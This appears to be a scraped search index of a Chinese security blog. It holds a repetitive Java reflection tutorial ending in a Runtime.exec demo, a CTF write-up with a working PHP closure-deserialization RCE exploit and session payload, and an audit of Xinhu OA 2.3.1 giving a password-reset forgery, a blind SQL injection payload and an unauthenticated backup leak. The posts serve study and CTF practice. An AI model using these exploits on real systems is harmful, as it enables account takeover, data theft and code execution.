ClassNotFoundException { Class name = ClassLoader.getSystemClassLoader().loadClass(\"java.lang.Runtime\"); System.out.println(name); } } ","date":"2022-03-07","objectID":"/java%E5%AE%89%E5%85%A8_%E5%8F%8D%E5%B0%84/:2:1","series":null,"tags":null,"title":"[Java安全]反射","uri":"/java%E5%AE%89%E5%85%A8_%E5%8F%8D%E5%B0%84/#b-直接获取"},{"categories":["Java"],"content":"1. 获取类a. forName()方法只需要知道类名，在加载JDBC的时候会采用 实例代码 public class test1 { public static void main(String[] args) throws ClassNotFoundException { Class name = Class.forName(\"java.lang.Runtime\"); System.out.println(name); } } b. 直接获取使用.class去获取对象 public class test1 { public static void main(String[] args) throws ClassNotFoundException { Class name = Runtime.class; System.out.println(name); } } c. getClass()方法obj.getClass() 如果上下⽂中存在某个类的实例 obj ，那么我们可以直接通过 obj.getClass() 来获取它的类 public class test1 { public static void main(String[] args) throws ClassNotFoundException { Runtime rt = Runtime.getRuntime(); Class name = rt.getClass(); System.out.println(name); } } d. getSystemClassLoader().loadClass()方法这个方法和forName类似，只要有类名就可以了，但是区别在于，forName的静态JVM会装载类，并执行static()中的代码 public class getSystemClassLoader { public static void main(String[] args) throws ClassNotFoundException { Class name = ClassLoader.getSystemClassLoader().loadClass(\"java.lang.Runtime\"); System.out.println(name); } } ","date":"2022-03-07","objectID":"/java%E5%AE%89%E5%85%A8_%E5%8F%8D%E5%B0%84/:2:1","series":null,"tags":null,"title":"[Java安全]反射","uri":"/java%E5%AE%89%E5%85%A8_%E5%8F%8D%E5%B0%84/#c-getclass方法"},{"categories":["Java"],"content":"1. 获取类a. forName()方法只需要知道类名，在加载JDBC的时候会采用 实例代码 public class test1 { public static void main(String[] args) throws ClassNotFoundException { Class name = Class.forName(\"java.lang.Runtime\"); System.out.println(name); } } b. 直接获取使用.class去获取对象 public class test1 { public static void main(String[] args) throws ClassNotFoundException { Class name = Runtime.class; System.out.println(name); } } c. getClass()方法obj.getClass() 如果上下⽂中存在某个类的实例 obj ，那么我们可以直接通过 obj.getClass() 来获取它的类 public class test1 { public static void main(String[] args) throws ClassNotFoundException { Runtime rt = Runtime.getRuntime(); Class name = rt.getClass(); System.out.println(name); } } d. getSystemClassLoader().loadClass()方法这个方法和forName类似，只要有类名就可以了，但是区别在于，forName的静态JVM会装载类，并执行static()中的代码 public class getSystemClassLoader { public static void main(String[] args) throws ClassNotFoundException { Class name = ClassLoader.getSystemClassLoader().loadClass(\"java.lang.Runtime\"); System.out.println(name); } } ","date":"2022-03-07","objectID":"/java%E5%AE%89%E5%85%A8_%E5%8F%8D%E5%B0%84/:2:1","series":null,"tags":null,"title":"[Java安全]反射","uri":"/java%E5%AE%89%E5%85%A8_%E5%8F%8D%E5%B0%84/#d-getsystemclassloaderloadclass方法"},{"categories":["Java"],"content":"2. 获取类方法a. getDeclaredMethods返回类或接口声明的所有方法，包括public、protected、private和默认方法，但是不包括继承的方法 import java.lang.reflect.Method; public class getDeclaredMethods { public static void main(String[] args) throws ClassNotFoundException { Class\u003c?\u003e name = Class.forName(\"java.lang.Runtime\"); System.out.println(name); Method[] m = name.getDeclaredMethods(); for(Method x:m) System.out.println(x); } } b. getDeclaredMethod获取特定的方法，第一个参数是方法名，第二个参数是该方法的参数对应的class对象，例如这里Runtime的exec方法参数为一个String，所以这里的第二个参数是String.class import java.lang.reflect.Method; public class getDeclaredMethod { public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException { Class\u003c?\u003e name = Class.forName(\"java.lang.Runtime\"); Method m = name.getDeclaredMethod(\"exec\",String.class); System.out.println(m); } } c. getMethods返回某个类所有的public方法，包括继承类的public方法 d. getMethod参数同理getDeclaredMethod ","date":"2022-03-07","objectID":"/java%E5%AE%89%E5%85%A8_%E5%8F%8D%E5%B0%84/:2:2","series":null,"tags":null,"title":"[Java安全]反射","uri":"/java%E5%AE%89%E5%85%A8_%E5%8F%8D%E5%B0%84/#2-获取类方法"},{"categories":["Java"],"content":"2. 获取类方法a. getDeclaredMethods返回类或接口声明的所有方法，包括public、protected、private和默认方法，但是不包括继承的方法 import java.lang.reflect.Method; public class getDeclaredMethods { public static void main(String[] args) throws ClassNotFoundException { Class name = Class.forName(\"java.lang.Runtime\"); System.out.println(name); Method[] m = name.getDeclaredMethods(); for(Method x:m) System.out.println(x); } } b. getDeclaredMethod获取特定的方法，第一个参数是方法名，第二个参数是该方法的参数对应的class对象，例如这里Runtime的exec方法参数为一个String，所以这里的第二个参数是String.class import java.lang.reflect.Method; public class getDeclaredMethod { public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException { Class name = Class.forName(\"java.lang.Runtime\"); Method m = name.getDeclaredMethod(\"exec\",String.class); System.out.println(m); } } c. getMethods返回某个类所有的public方法，包括继承类的public方法 d. getMethod参数同理getDeclaredMethod ","date":"2022-03-07","objectID":"/java%E5%AE%89%E5%85%A8_%E5%8F%8D%E5%B0%84/:2:2","series":null,"tags":null,"title":"[Java安全]反射","uri":"/java%E5%AE%89%E5%85%A8_%E5%8F%8D%E5%B0%84/#a-getdeclaredmethods"},{"categories":["Java"],"content":"2. 获取类方法a. getDeclaredMethods返回类或接口声明的所有方法，包括public、protected、private和默认方法，但是不包括继承的方法 import java.lang.reflect.Method; public class getDeclaredMethods { public static void main(String[] args) throws ClassNotFoundException { Class name = Class.forName(\"java.lang.Runtime\"); System.out.println(name); Method[] m = name.getDeclaredMethods(); for(Method x:m) System.out.println(x); } } b. getDeclaredMethod获取特定的方法，第一个参数是方法名，第二个参数是该方法的参数对应的class对象，例如这里Runtime的exec方法参数为一个String，所以这里的第二个参数是String.class import java.lang.reflect.Method; public class getDeclaredMethod { public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException { Class name = Class.forName(\"java.lang.Runtime\"); Method m = name.getDeclaredMethod(\"exec\",String.class); System.out.println(m); } } c. getMethods返回某个类所有的public方法，包括继承类的public方法 d. getMethod参数同理getDeclaredMethod ","date":"2022-03-07","objectID":"/java%E5%AE%89%E5%85%A8_%E5%8F%8D%E5%B0%84/:2:2","series":null,"tags":null,"title":"[Java安全]反射","uri":"/java%E5%AE%89%E5%85%A8_%E5%8F%8D%E5%B0%84/#b-getdeclaredmethod"},{"categories":["Java"],"content":"2. 获取类方法a. getDeclaredMethods返回类或接口声明的所有方法，包括public、protected、private和默认方法，但是不包括继承的方法 import java.lang.reflect.Method; public class getDeclaredMethods { public static void main(String[] args) throws ClassNotFoundException { Class name = Class.forName(\"java.lang.Runtime\"); System.out.println(name); Method[] m = name.getDeclaredMethods(); for(Method x:m) System.out.println(x); } } b. getDeclaredMethod获取特定的方法，第一个参数是方法名，第二个参数是该方法的参数对应的class对象，例如这里Runtime的exec方法参数为一个String，所以这里的第二个参数是String.class import java.lang.reflect.Method; public class getDeclaredMethod { public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException { Class name = Class.forName(\"java.lang.Runtime\"); Method m = name.getDeclaredMethod(\"exec\",String.class); System.out.println(m); } } c. getMethods返回某个类所有的public方法，包括继承类的public方法 d. getMethod参数同理getDeclaredMethod ","date":"2022-03-07","objectID":"/java%E5%AE%89%E5%85%A8_%E5%8F%8D%E5%B0%84/:2:2","series":null,"tags":null,"title":"[Java安全]反射","uri":"/java%E5%AE%89%E5%85%A8_%E5%8F%8D%E5%B0%84/#c-getmethods"},{"categories":["Java"],"content":"2. 获取类方法a. getDeclaredMethods返回类或接口声明的所有方法，包括public、protected、private和默认方法，但是不包括继承的方法 import java.lang.reflect.Method; public class getDeclaredMethods { public static void main(String[] args) throws ClassNotFoundException { Class name = Class.forName(\"java.lang.Runtime\"); System.out.println(name); Method[] m = name.getDeclaredMethods(); for(Method x:m) System.out.println(x); } } b. getDeclaredMethod获取特定的方法，第一个参数是方法名，第二个参数是该方法的参数对应的class对象，例如这里Runtime的exec方法参数为一个String，所以这里的第二个参数是String.class import java.lang.reflect.Method; public class getDeclaredMethod { public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException { Class name = Class.forName(\"java.lang.Runtime\"); Method m = name.getDeclaredMethod(\"exec\",String.class); System.out.println(m); } } c. getMethods返回某个类所有的public方法，包括继承类的public方法 d. getMethod参数同理getDeclaredMethod ","date":"2022-03-07","objectID":"/java%E5%AE%89%E5%85%A8_%E5%8F%8D%E5%B0%84/:2:2","series":null,"tags":null,"title":"[Java安全]反射","uri":"/java%E5%AE%89%E5%85%A8_%E5%8F%8D%E5%B0%84/#d-getmethod"},{"categories":["Java"],"content":"3. 获取成员变量同理Method的那几个方法 a. getDeclaredFields获取类的成员的所有变量数组，但是不包括父类的 b. getDeclaredField(String name)获取特定的，参数是想要的方法的名称 c. getFields()同理，只能获得public的，但是包括了父类的 d. getField(String name)同理，参数是想要的方法的名称 ","date":"2022-03-07","objectID":"/java%E5%AE%89%E5%85%A8_%E5%8F%8D%E5%B0%84/:2:3","series":null,"tags":null,"title":"[Java安全]反射","uri":"/java%E5%AE%89%E5%85%A8_%E5%8F%8D%E5%B0%84/#3-获取成员变量"},{"categories":["Java"],"content":"3. 获取成员变量同理Method的那几个方法 a. getDeclaredFields获取类的成员的所有变量数组，但是不包括父类的 b. getDeclaredField(String name)获取特定的，参数是想要的方法的名称 c. getFields()同理，只能获得public的，但是包括了父类的 d. getField(String name)同理，参数是想要的方法的名称 ","date":"2022-03-07","objectID":"/java%E5%AE%89%E5%85%A8_%E5%8F%8D%E5%B0%84/:2:3","series":null,"tags":null,"title":"[Java安全]反射","uri":"/java%E5%AE%89%E5%85%A8_%E5%8F%8D%E5%B0%84/#a-getdeclaredfields"},{"categories":["Java"],"content":"3. 获取成员变量同理Method的那几个方法 a. getDeclaredFields获取类的成员的所有变量数组，但是不包括父类的 b. getDeclaredField(String name)获取特定的，参数是想要的方法的名称 c. getFields()同理，只能获得public的，但是包括了父类的 d. getField(String name)同理，参数是想要的方法的名称 ","date":"2022-03-07","objectID":"/java%E5%AE%89%E5%85%A8_%E5%8F%8D%E5%B0%84/:2:3","series":null,"tags":null,"title":"[Java安全]反射","uri":"/java%E5%AE%89%E5%85%A8_%E5%8F%8D%E5%B0%84/#b-getdeclaredfieldstring-name"},{"categories":["Java"],"content":"3. 获取成员变量同理Method的那几个方法 a. getDeclaredFields获取类的成员的所有变量数组，但是不包括父类的 b. getDeclaredField(String name)获取特定的，参数是想要的方法的名称 c. getFields()同理，只能获得public的，但是包括了父类的 d. getField(String name)同理，参数是想要的方法的名称 ","date":"2022-03-07","objectID":"/java%E5%AE%89%E5%85%A8_%E5%8F%8D%E5%B0%84/:2:3","series":null,"tags":null,"title":"[Java安全]反射","uri":"/java%E5%AE%89%E5%85%A8_%E5%8F%8D%E5%B0%84/#c-getfields"},{"categories":["Java"],"content":"3. 获取成员变量同理Method的那几个方法 a. getDeclaredFields获取类的成员的所有变量数组，但是不包括父类的 b. getDeclaredField(String name)获取特定的，参数是想要的方法的名称 c. getFields()同理，只能获得public的，但是包括了父类的 d. getField(String name)同理，参数是想要的方法的名称 ","date":"2022-03-07","objectID":"/java%E5%AE%89%E5%85%A8_%E5%8F%8D%E5%B0%84/:2:3","series":null,"tags":null,"title":"[Java安全]反射","uri":"/java%E5%AE%89%E5%85%A8_%E5%8F%8D%E5%B0%84/#d-getfieldstring-name"},{"categories":["Java"],"content":"4. 获取构造函数Constructor Constructor\u003c?\u003e[] getConstructors() ：只返回public构造函数 Constructor\u003c?\u003e[] getDeclaredConstructors() ：返回所有构造函数 Constructor\u003c\u003e getConstructor(类\u003c?\u003e... parameterTypes) : 匹配和参数配型相符的public构造函数 Constructor\u003c\u003e getDeclaredConstructor(类\u003c?\u003e... parameterTypes) ： 匹配和参数配型相符的构造函数 后面两个方法的参数是对于方法的参数的类型的class对象，和Method的那个类似，例如String.class ","date":"2022-03-07","objectID":"/java%E5%AE%89%E5%85%A8_%E5%8F%8D%E5%B0%84/:2:4","series":null,"tags":null,"title":"[Java安全]反射","uri":"/java%E5%AE%89%E5%85%A8_%E5%8F%8D%E5%B0%84/#4-获取构造函数constructor"},{"categories":["Java"],"content":"5. 反射创建类对象newInstance可以通过反射来生成实例化对象，一般我们使用Class对象的newInstance()方法来进行创建类对象 创建的方法就是：只需要通过forname方法获取到的class对象中进行newInstance方法创建即可 Class c = Class.forName(\"com.reflect.MethodTest\"); // 创建Class对象 Object m1 = c.newInstance(); // 创建类对象 invokeinvoke方法位于java.lang.reflect.Method类中，用于执行某个的对象的目标方法,一般会和getMethod方法配合进行调用。 使用用法： public Object invoke(Object obj, Object... args) 第一个参数为类的实例，第二个参数为相应函数中的参数 obj：从中调用底层方法的对象，必须是实例化对象 args： 用于方法的调用，是一个object的数组，参数有可能是多个 但需要注意的是，invoke方法第一个参数并不是固定的： 如果调用这个方法是普通方法，第一个参数就是类对象； 如果调用这个方法是静态方法，第一个参数就是类； 通过一个例子去理解 import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; public class Invoke { public static void main(String[] args) throws ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException, InvocationTargetException { Class c = Class.forName(\"Invoke\"); Object o = c.newInstance(); Method m = c.getMethod(\"test\"); m.invoke(o); } public void test(){ System.out.println(\"测试成功\"); } } 简单来说就是这样 方法.invoke(类或类对象) 先forName拿到Class，再newInstance获取类对象，再getMethod获取方法，然后调用 ","date":"2022-03-07","objectID":"/java%E5%AE%89%E5%85%A8_%E5%8F%8D%E5%B0%84/:2:5","series":null,"tags":null,"title":"[Java安全]反射","uri":"/java%E5%AE%89%E5%85%A8_%E5%8F%8D%E5%B0%84/#5-反射创建类对象"},{"categories":["Java"],"content":"5. 反射创建类对象newInstance可以通过反射来生成实例化对象，一般我们使用Class对象的newInstance()方法来进行创建类对象 创建的方法就是：只需要通过forname方法获取到的class对象中进行newInstance方法创建即可 Class c = Class.forName(\"com.reflect.MethodTest\"); // 创建Class对象 Object m1 = c.newInstance(); // 创建类对象 invokeinvoke方法位于java.lang.reflect.Method类中，用于执行某个的对象的目标方法,一般会和getMethod方法配合进行调用。 使用用法： public Object invoke(Object obj, Object... args) 第一个参数为类的实例，第二个参数为相应函数中的参数 obj：从中调用底层方法的对象，必须是实例化对象 args： 用于方法的调用，是一个object的数组，参数有可能是多个 但需要注意的是，invoke方法第一个参数并不是固定的： 如果调用这个方法是普通方法，第一个参数就是类对象； 如果调用这个方法是静态方法，第一个参数就是类； 通过一个例子去理解 import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; public class Invoke { public static void main(String[] args) throws ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException, InvocationTargetException { Class c = Class.forName(\"Invoke\"); Object o = c.newInstance(); Method m = c.getMethod(\"test\"); m.invoke(o); } public void test(){ System.out.println(\"测试成功\"); } } 简单来说就是这样 方法.invoke(类或类对象) 先forName拿到Class，再newInstance获取类对象，再getMethod获取方法，然后调用 ","date":"2022-03-07","objectID":"/java%E5%AE%89%E5%85%A8_%E5%8F%8D%E5%B0%84/:2:5","series":null,"tags":null,"title":"[Java安全]反射","uri":"/java%E5%AE%89%E5%85%A8_%E5%8F%8D%E5%B0%84/#newinstance"},{"categories":["Java"],"content":"5. 反射创建类对象newInstance可以通过反射来生成实例化对象，一般我们使用Class对象的newInstance()方法来进行创建类对象 创建的方法就是：只需要通过forname方法获取到的class对象中进行newInstance方法创建即可 Class c = Class.forName(\"com.reflect.MethodTest\"); // 创建Class对象 Object m1 = c.newInstance(); // 创建类对象 invokeinvoke方法位于java.lang.reflect.Method类中，用于执行某个的对象的目标方法,一般会和getMethod方法配合进行调用。 使用用法： public Object invoke(Object obj, Object... args) 第一个参数为类的实例，第二个参数为相应函数中的参数 obj：从中调用底层方法的对象，必须是实例化对象 args： 用于方法的调用，是一个object的数组，参数有可能是多个 但需要注意的是，invoke方法第一个参数并不是固定的： 如果调用这个方法是普通方法，第一个参数就是类对象； 如果调用这个方法是静态方法，第一个参数就是类； 通过一个例子去理解 import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; public class Invoke { public static void main(String[] args) throws ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException, InvocationTargetException { Class c = Class.forName(\"Invoke\"); Object o = c.newInstance(); Method m = c.getMethod(\"test\"); m.invoke(o); } public void test(){ System.out.println(\"测试成功\"); } } 简单来说就是这样 方法.invoke(类或类对象) 先forName拿到Class，再newInstance获取类对象，再getMethod获取方法，然后调用 ","date":"2022-03-07","objectID":"/java%E5%AE%89%E5%85%A8_%E5%8F%8D%E5%B0%84/:2:5","series":null,"tags":null,"title":"[Java安全]反射","uri":"/java%E5%AE%89%E5%85%A8_%E5%8F%8D%E5%B0%84/#invoke"},{"categories":["Java"],"content":"Runtime的rce例子（访问限制突破）Runtime类里面有一个exec方法，可以执行命令 import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; public class Exec { public static void main(String[] args) throws ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException, InvocationTargetException { Class c = Class.forName(\"java.lang.Runtime\"); Object o = c.newInstance(); Method m = c.getMethod(\"exec\",String.class); m.invoke(o,\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\"); } } 但是发现报错了 出现这个问题的原因： 使用的类没有无参构造函数 使用的类构造函数是私有的 那么解决方案就是setAccessible(true);，用这个去突破访问限制 Java.lang.reflect.AccessibleObject类是Field，Method和Constructor类对象的基类，可以提供将反射对象标记为使用它抑制摸人Java访问控制检查的功能，同时上述的反射类中的Field，Method和Constructor继承自AccessibleObject。所以我们在这些类方法基础上调用setAccessible()方法，既可对这些私有字段进行操作 简单来说，私有的属性、方法、构造方法，可以通过这个去突破限制，xxx.setAccessible(true) 可以看到Runtime的构造方法是private的 那么这里我们就可以这么去突破限制 先获取构造方法，然后setAccessible获取访问权限 然后再最后invoke里面，第一个参数写成con.newInstance() import java.lang.reflect.Constructor; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; public class Exec { public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, InstantiationException { Class c = Class.forName(\"java.lang.Runtime\"); Constructor con = c.getDeclaredConstructor(); con.setAccessible(true); Method m = c.getMethod(\"exec\",String.class); m.invoke(con.newInstance(),\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\"); } } 这里有一个疑问，如果把con.newInstance单独提取出来，他打开计算器不会显示出来，但是后台的确是启动了，不知道啥原因 import java.lang.reflect.Constructor; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; public class Exec { public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, InstantiationException { Class c = Class.forName(\"java.lang.Runtime\"); Constructor con = c.getDeclaredConstructor(); con.setAccessible(true); Object o = con.newInstance(); Method m = c.getMethod(\"exec\",String.class); m.invoke(o,\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\"); } } ","date":"2022-03-07","objectID":"/java%E5%AE%89%E5%85%A8_%E5%8F%8D%E5%B0%84/:3:0","series":null,"tags":null,"title":"[Java安全]反射","uri":"/java%E5%AE%89%E5%85%A8_%E5%8F%8D%E5%B0%84/#runtime的rce例子访问限制突破"},{"categories":["Java"],"content":"后记反射中常用的几个重要方法： 获取类的⽅法： forName 实例化类对象的⽅法： newInstance 获取函数的⽅法： getMethod 执⾏函数的⽅法： invoke 限制突破方法：setAccessible ","date":"2022-03-07","objectID":"/java%E5%AE%89%E5%85%A8_%E5%8F%8D%E5%B0%84/:4:0","series":null,"tags":null,"title":"[Java安全]反射","uri":"/java%E5%AE%89%E5%85%A8_%E5%8F%8D%E5%B0%84/#后记"},{"categories":["技术分享"],"content":"题目地址SycloverTeam提供了题目的docker环境 https://github.com/SycloverTeam/SCTF2021/tree/master/web/Upload_it_1 ","date":"2022-02-13","objectID":"/sctf2021/:0:0","series":null,"tags":null,"title":"[SCTF2021]Upload_it_1复现闭包组件反序列化rce","uri":"/sctf2021/#题目地址"},{"categories":["技术分享"],"content":"wp首先题目给了composer.json { \"name\": \"sctf2021/upload\", \"authors\": [ { \"name\": \"AFKL\", \"email\": \"upload@qq.com\" } ], \"require\": { \"symfony/string\": \"^5.3\", \"opis/closure\": \"^3.6\" } } 导入了两个包，那就肯定是组件相关的攻击了 \"symfony/string\": \"^5.3\", \"opis/closure\": \"^3.6\" composer update一下 第二个组件是关于闭包反序列化的，所以猜测和序列化有关 index.php内的主要逻辑代码 if (!empty($_POST['path'])) { $upload_file_path = $_SESSION[\"upload_path\"].\"/\".$_POST['path']; $upload_file = $upload_file_path.\"/\".$file['name']; } else { $upload_file_path = $_SESSION[\"upload_path\"]; $upload_file = $_SESSION[\"upload_path\"].\"/\".$file['name']; } if (move_uploaded_file($file['tmp_name'], $upload_file)) { echo \"OK! Your file saved in: \" . $upload_file; } else { echo \"emm...Upload failed:(\"; } } else { echo \"too big!!!\"; } 这里会调用$_SESSION[\"upload_path\"]，那么考虑到session反序列化 题目测试到，上传可以进行目录穿越，但是只有tmp目录可写 题目有给到phpinfo()，打开看一下，path没给，但是能操作的目录只有tmp，那么肯定就是/tmp/sess_xxxx了 那么我们就是可以操控session文件了，所以我们现在的目的就是怎么去构造一个session文件去rce 可以看到index.php里面session拼接了： $_SESSION[\"upload_path\"].\"/\".$_POST['path']; 所以如果 $_SESSION[\"upload_path\"]是一个对象的话，那就会触发一个__toString方法了 那么我们就去找一个可以利用的__toString方法，这里是可以利用的在LazyString这里找到利用的方法 再看到这个组件，opis/closure，可序列化闭包，那么我们就可以通过创建一个攻击性的闭包去反序列化，这样完成我们的攻击 那么如此，我们就可以构造我们的exp了 \u003c?php namespace Symfony\\Component\\String { class LazyString { private $value; public function __construct($a){ $this-\u003evalue = $a; } } } namespace { include_once \"../vendor/autoload.php\"; $func = function() {system(\"cat /flag\");}; $raw = \\Opis\\Closure\\serialize($func); $data = unserialize($raw); $exp = new \\Symfony\\Component\\String\\LazyString($data); echo urlencode(serialize($exp)); } payload，注意%00的解码，前面拼接上upload_path| upload_path|O:35:\"Symfony\\Component\\String\\LazyString\":1:{s:42:\"%00Symfony\\Component\\String\\LazyString%00value\";C:32:\"Opis\\Closure\\SerializableClosure\":157:{a:5:{s:3:\"use\";a:0:{}s:8:\"function\";s:34:\"function() {\\system(\"cat /flag\");}\";s:5:\"scope\";N;s:4:\"this\";N;s:4:\"self\";s:32:\"0000000045e636f7000000007352e912\";}}} 再次上传文件，利用session去拼接调用__toString方法，成功rce ","date":"2022-02-13","objectID":"/sctf2021/:0:0","series":null,"tags":null,"title":"[SCTF2021]Upload_it_1复现闭包组件反序列化rce","uri":"/sctf2021/#wp"},{"categories":["技术分享"],"content":"预期解看了作者给的wp，发现预期解是通过__sleep方法去调用__toString方法的 而php原生的session执行反序列化的时候，的确会调用__sleep方法 ","date":"2022-02-13","objectID":"/sctf2021/:0:0","series":null,"tags":null,"title":"[SCTF2021]Upload_it_1复现闭包组件反序列化rce","uri":"/sctf2021/#预期解"},{"categories":["技术分享"],"content":"思路这道题的整个的思路就是： 首先测试到上传的文件可以进行目录穿越，但是只有tmp目录有权限 源码中观察到闭包反序列化组件，方向可能是反序列化，执行composer update安装源码 有session的使用，可以上传文件到tmp，而且有session的使用，而且phpinfo中有写是file，所以考虑到是session反序列化 构造闭包去序列化打rce ","date":"2022-02-13","objectID":"/sctf2021/:0:0","series":null,"tags":null,"title":"[SCTF2021]Upload_it_1复现闭包组件反序列化rce","uri":"/sctf2021/#思路"},{"categories":["技术分享"],"content":"前言对于这个OA的代码审计是在最近的西湖论剑比赛中出的一个web题，题目是2.3.1版本的信呼OA，在当时是最新版的（2021.11.20） 这次比赛结束打算好好审计一波 ","date":"2021-11-30","objectID":"/%E4%BF%A1%E5%91%BCoa2.3.1%E7%89%88%E6%9C%AC%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/:0:0","series":null,"tags":null,"title":"[代码审计]信呼OA2.3.1版本代码审计","uri":"/%E4%BF%A1%E5%91%BCoa2.3.1%E7%89%88%E6%9C%AC%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/#前言"},{"categories":["技术分享"],"content":"环境搭建此次代码审计我用的是2.3.1版本 项目地址： https://xinhu-1251238447.file.myqcloud.com/file/xinhu_utf8_v2.3.1.zip 安装好后，修改admin的密码，成功初始化 ","date":"2021-11-30","objectID":"/%E4%BF%A1%E5%91%BCoa2.3.1%E7%89%88%E6%9C%AC%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/:0:0","series":null,"tags":null,"title":"[代码审计]信呼OA2.3.1版本代码审计","uri":"/%E4%BF%A1%E5%91%BCoa2.3.1%E7%89%88%E6%9C%AC%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/#环境搭建"},{"categories":["技术分享"],"content":"漏洞分析","date":"2021-11-30","objectID":"/%E4%BF%A1%E5%91%BCoa2.3.1%E7%89%88%E6%9C%AC%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/:0:0","series":null,"tags":null,"title":"[代码审计]信呼OA2.3.1版本代码审计","uri":"/%E4%BF%A1%E5%91%BCoa2.3.1%E7%89%88%E6%9C%AC%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/#漏洞分析"},{"categories":["技术分享"],"content":"修改任意用户密码在安装完该OA系统后，我修改了默认密码为1234qwer 漏洞存在于webmain/task/api/reimplatAction.php中 看到这里的代码 public function indexAction() { $body = $this-\u003egetpostdata(); if(!$body)return; $db = m('reimplat:dept'); $key = $db-\u003egethkey(); $bodystr = $this-\u003ejm-\u003estrunlook($body, $key); if(!$bodystr)return; $data = json_decode($bodystr, true); $msgtype = arrvalue($data,'msgtype'); $msgevent= arrvalue($data,'msgevent'); ============中间省略================================ //修改密码 if($msgtype=='editpass'){ $user = arrvalue($data, 'user'); $pass = arrvalue($data, 'pass'); if($pass \u0026\u0026 $user){ $where = \"`user`='$user'\"; $mima = md5($pass); m('admin')-\u003eupdate(\"`pass`='$mima',`editpass`=`editpass`+1\", $where); } } } 首先是getpostdata()方法获取post传入的数据 第二个点就是key，我们跟进这个getkey()方法 在webmain/model/reimplat/reimplat.php中可以看到如下代码，会返回md5值 默认安装完系统这个是空的 返回的也就是空string的md5值，即d41d8cd98f00b204e9800998ecf8427e public function gethkey() { $key = $this-\u003ereimplat_huitoken; if(isempt($key))$key = $this-\u003ereimplat_secret; if(isempt($key))$key = $this-\u003ereimplat_cnum; return md5($key); } 然后就是$bodystr = $this-\u003ejm-\u003estrunlook($body, $key);，这里对我们传入的数据进行解密 那么我们可以在下面构造一个加密，获取到修改后的sign，如下图所示 $test = $this-\u003ejm-\u003estrlook(json_encode(array(\"msgtype\"=\u003e\"editpass\",\"user\"=\u003e\"admin\",\"pass\"=\u003e\"123456\")), $key); echo $test; 发包时还是得用post方法发包，成功拿到恶意修改的sign 此时我们再把这个sign作为post数据穿进去，经过getpostdata()获取到data，再通过相同的key去通过strunlook()进行解密，从而进入判断条件 修改密码 $msgtype=='editpass' 发包如下 密码成功修改成了123456 ","date":"2021-11-30","objectID":"/%E4%BF%A1%E5%91%BCoa2.3.1%E7%89%88%E6%9C%AC%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/:1:0","series":null,"tags":null,"title":"[代码审计]信呼OA2.3.1版本代码审计","uri":"/%E4%BF%A1%E5%91%BCoa2.3.1%E7%89%88%E6%9C%AC%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/#修改任意用户密码"},{"categories":["技术分享"],"content":"文件上传处sql盲注需要先登录后台才能使用文件上传 webmain/public/upload/uploadAction.php 在upfileAjax方法里面，找到执行sql语句处，跟进uploadback方法 这里有一个过滤函数，跟进看一下 这里注释说明了是过滤特殊的文件名，可以看到，这里过滤的很少 修改uptype为*，文件名为sql注入语句，可以看到成功延时 盲注语句可以这样写，这里单独的()会被过滤掉，双写就可以了 1' and if(ascii(substr((select database(())),1,1))\u003e1,SLEEP(3),0)-- - 这样就可以写脚本跑内容了，这里就不多说了 ","date":"2021-11-30","objectID":"/%E4%BF%A1%E5%91%BCoa2.3.1%E7%89%88%E6%9C%AC%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/:2:0","series":null,"tags":null,"title":"[代码审计]信呼OA2.3.1版本代码审计","uri":"/%E4%BF%A1%E5%91%BCoa2.3.1%E7%89%88%E6%9C%AC%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/#文件上传处sql盲注"},{"categories":["技术分享"],"content":"未授权备份在webmain/task/runt/sysAction.php中 这里用beifenClassModel调用了他的start方法 找到beifenClassModel，看到里面的start方法 会把数据库数据备份到upload/data目录下，以时间命名 payload： /task.php?m=sys|runt\u0026a=beifen 可以发现已经备份过来了 都是可以直接访问的，可以爆破一下文件名去拿 这里是可以拿到管理员密码的 这个的前提是知道数据库的库名，不然还是打不了了，默认是xinhu ","date":"2021-11-30","objectID":"/%E4%BF%A1%E5%91%BCoa2.3.1%E7%89%88%E6%9C%AC%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/:3:0","series":null,"tags":null,"title":"[代码审计]信呼OA2.3.1版本代码审计","uri":"/%E4%BF%A1%E5%91%BCoa2.3.1%E7%89%88%E6%9C%AC%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/#未授权备份"},{"categories":["技术分享"],"content":"前言漏洞存在版本，分为两大版本： ThinkPHP 5.0-5.0.24 ThinkPHP 5.1.0-5.1.30 ","date":"2021-11-26","objectID":"/thinkphp5.0.x%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E5%AF%BC%E8%87%B4%E7%9A%84rce%E5%88%86%E6%9E%90/:0:0","series":null,"tags":null,"title":"[代码审计]ThinkPHP 5.0.x 